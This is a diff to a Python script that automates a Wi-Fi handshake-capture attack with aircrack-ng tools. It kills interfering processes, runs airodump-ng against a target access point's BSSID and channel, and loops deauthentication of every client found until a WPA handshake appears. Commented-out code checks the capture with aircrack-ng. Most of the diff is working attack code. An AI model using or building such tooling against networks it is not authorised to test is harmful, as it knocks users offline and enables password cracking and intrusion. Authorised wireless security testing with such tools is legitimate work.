@@ -128,6 +128,7 @@ def environmentSetup():
 		print("Listing interfaces...")
 		interfaceName = getInterfaceName()
 
+
 def killInterference():
 	print("Killing potential interfering processes...")
 	process = bash_command("airmon-ng check kill")
@@ -181,6 +182,8 @@ def getTargetAccessPoint():
 		result = input("Start new scan? (y=yes): ")
 		if result == 'y' or result == 'yes' or result == '1':
 			channel = ''
+			if os.path.isfile(packetPath + "dump-01.csv"):
+				os.remove(packetPath + "dump-01.csv")
 			continue
 		else:
 			break
@@ -300,27 +303,45 @@ def captureHandshake():
 	airodump_proc = bash_command("airodump-ng" +
 			" -c " + str(channel) +
 			" --bssid " + str(targetBSSID) +
-			" --output-format cap" +
+			" --output-format cap --output-format csv" +
 			" -w " + packetPath + "packet" +
 			" " + str(interfaceName),
-			stdout=None,
+			stdout=None, 
 			stderr=None,
 			stdin=None)
 
 	timeStart = time.time()
+
+	# Deauthenticate clients until a handshake appears in the packet dump
 	while True:
-		client_list = scanClientsForAccessPoint()
+		client_list = scanClientsAtAccessPoint()
+
 		for client in client_list:
 			deauthenticateClient(client)
+			# Attempt 1
+			# if airodump_proc.stdout.read().decode('utf-8').contains("handshake"):
+			# 	print("Handshake captured.")
+			# 	airodump_proc.terminate()
+			# 	return
+
+		time.sleep(1)
+		# Attempt 2
+		# aircrackGrep = bash_command("aircrack-ng packet-01.cap | grep handshake > " + packetPath + "../check.txt", stderr=None)
+		# time.sleep(2)
+		# aircrackGrep.terminate()
+		# if aircrackGrep.stdout.read().decode('utf-8').contains("handshake"):
+
 		if time.time()-timeStart > int(scanTime):
 			break
 
 	time.sleep(10)
 	print("Killing packet dump of AP: " + targetBSSID)
 	airodump_proc.terminate()
+	# if os.path.isfile(packetPath + "check.txt"): # part of Attempt 2
+		# assert(0)
 
 
-def scanClientsForAccessPoint(targetESSID=None, scanTime=5):
+def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
 	global targetBSSID
 	global channel
 	global interfaceName
@@ -335,7 +356,7 @@ def scanClientsForAccessPoint(targetESSID=None, scanTime=5):
 	# scanTime = ''
 	# while not scanTime.isdigit():
 	# 	scanTime = input("Time limit to listen for clients (seconds): ")
-	process = bash_command("airodump-ng -c " + channel + " -w " + packetPath+"client" + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	process = bash_command("airodump-ng --output-format csv -c " + channel + " -w " + packetPath+"client" + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 	# wait for airodump to dump client csv list
 	timeStart = time.time()
@@ -360,6 +381,9 @@ def scanClientsForAccessPoint(targetESSID=None, scanTime=5):
 	print("Found clients:")
 
 	process.terminate()
+	if os.path.isfile(packetPath + "client-01.csv"):
+			os.remove(packetPath + "client-01.csv")
+
 	return client_list
 
 
